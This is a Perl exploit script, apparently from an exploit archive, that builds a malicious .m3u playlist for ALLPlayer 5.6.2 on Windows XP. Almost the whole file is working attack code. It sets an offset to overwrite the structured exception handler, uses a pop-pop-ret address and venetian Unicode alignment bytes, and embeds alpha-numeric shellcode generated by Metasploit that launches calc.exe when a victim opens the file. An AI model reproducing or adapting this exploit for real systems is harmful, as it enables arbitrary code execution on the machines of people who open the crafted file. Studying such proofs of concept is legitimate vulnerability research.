#!/usr/bin/perl

###############################################################################
# Exploit Title: ALLPlayer 5.6.2 (.m3u) - SEH Buffer Overflow (Unicode)
# Date: 10-22-2013
# Exploit Author: Mike Czumak (T_v3rn1x) -- @SecuritySift
# Vulnerable Software: ALLPlayer 5.6.2 
# Software Link: http://www.allplayer.org/download/allplayer
# Version: 5.6.2
# Tested On: Windows XP SP3
#
# Credit to metacom for finding bug and publishing original POC
# - http://www.exploit-db.com/exploits/28855/ 
# Shouts to corelanc0d3r and b33f for some great unicode exploit tutorials
#
# Due to unicode conversion this is a venetian shellcode exploit
# To exploit simply open the created m3u file
##############################################################################
# Exploit-DB Note:
# This also affects version 5.7 of the application

my $buffsize = 5000; # sets buffer size for consistent sized payload
my $junk = "http://" . "\x41" x 303; # offset to seh
my $nseh = "\x61\x62"; # overwrite next seh with popad (populates all registers) + nop
my $seh = "\x11\x4d"; # overwrite seh with unicode friendly pop pop ret
		      # 0x004d0011 : pop ecx # pop ebp # ret  | startnull,unicode,ascii {PAGE_EXECUTE_READ} [ALLPlayer.exe] 
		      # ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.6.2.0 (C:\Program Files\ALLPlayer\ALLPlayer.exe)

# unicode venetian alignment
my $venalign = "\x53"; # push ebx; ebx is the register closest to our shellcode following the popad 
$venalign = $venalign . "\x71"; # venetian pad/align
$venalign = $venalign . "\x58"; # pop eax; put ebx into eax and modify to jump to our shellcode (100 bytes)
$venalign = $venalign . "\x6e"; # venetian pad/align
$venalign = $venalign . "\x05\x14\x11"; # add eax,0x11011400
$venalign = $venalign . "\x6e"; # venetian pad/align 
$venalign = $venalign . "\x2d\x13\x11"; # add eax,0x11011300
$venalign = $venalign . "\x6e"; # venetian pad/align
$venalign = $venalign . "\x50"; # push eax
$venalign = $venalign . "\x6d"; # venetian pad/align
$venalign = $venalign . "\xc3"; # ret

my $nops = "\x71" x 109; # some unicode friendly filler before the shellcode

# Calc.exe payload
# msfpayload windows/exec CMD=calc.exe R
# alpha2 unicode/uppercase
my $shell = "PPYAIAIAIAIAQATAXAZAPA3QADAZA".
"BARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA".
"58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABAB".
"AB30APB944JBKLK8U9M0M0KPS0U99UNQ8RS44KPR004K".
"22LLDKR2MD4KCBMXLOGG0JO6NQKOP1WPVLOLQQCLM2NL".
"MPGQ8OLMM197K2ZP22B7TK0RLPTK12OLM1Z04KOPBX55".
"Y0D4OZKQXP0P4KOXMHTKR8MPKQJ3ISOL19TKNTTKM18V".
"NQKONQ90FLGQ8OLMKQY7NXK0T5L4M33MKHOKSMND45JB".
"R84K0XMTKQHSBFTKLL0KTK28MLM18S4KKT4KKQXPSYOT".
"NDMTQKQK311IQJPQKOYPQHQOPZTKLRZKSVQM2JKQTMSU".
"89KPKPKP0PQX014K2O4GKOHU7KIPMMNJLJQXEVDU7MEM".
"KOHUOLKVCLLJSPKKIPT5LEGKQ7N33BRO1ZKP23KOYERC".
"QQ2LRCM0LJA";
 
my $sploit = $junk.$nseh.$seh.$venalign.$nops.$shell; # assemble the exploit portion of the buffer
my $fill = "\x71" x ($buffsize - length($sploit)); # fill remainder of buffer with junk
my $buffer = $sploit.$fill; # assemble the final buffer

# write the exploit buffer to file
my $file = "allplayer_unicodeseh.m3u";
open(FILE, ">$file");
print FILE $buffer;
close(FILE);
print "Exploit file [" . $file . "] created\n";
print "Buffer size: " . length($buffer) . "\n"; 